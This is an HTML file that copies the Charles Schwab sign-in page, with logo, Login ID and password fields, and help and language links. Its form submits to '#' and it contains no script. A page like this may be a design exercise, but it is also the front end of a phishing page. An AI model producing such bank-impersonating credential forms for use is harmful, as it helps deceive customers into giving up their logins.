<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Charles Schwab Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <img src="charls.png" alt="Charles Schwab Logo" class="header-logo">
    </header>

    <div class="login-container">
        <div class="login-box">
            <h2>Log in to Schwab</h3>
            <form action="#" method="POST">
               <br> <label for="loginID">Login ID</label>
                <input type="text" id="loginID" name="loginID" placeholder="Login ID" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>

                <div class="remember-me">
                    <input type="checkbox" id="rememberLogin" name="rememberLogin">
                    <label for="rememberLogin">Remember Login ID</label>
                </div>

                <label for="startPage">Start Page</label>
                <select id="startPage" name="startPage">
                    <option value="accountSummary">Account Summary</option>
                </select>

                <button type="submit">Log In</button>
            </form>

            <div class="login-links">
                <a href="#">Forgot Login ID or Password?</a>
                <a href="#">New User?</a>
            </div>
            
            <div class="language-selection">
                <label for="language">Language:</label>
                <select id="language" name="language">
                    <option value="english">English</option>
                    <option value="spanish">Espa√±ol</option>
                </select>
            </div>
        </div>

        <div class="background">
            <img src="charls3.jpeg" alt="Cityscape Background">
        </div>
    </div>
</body>
</html>
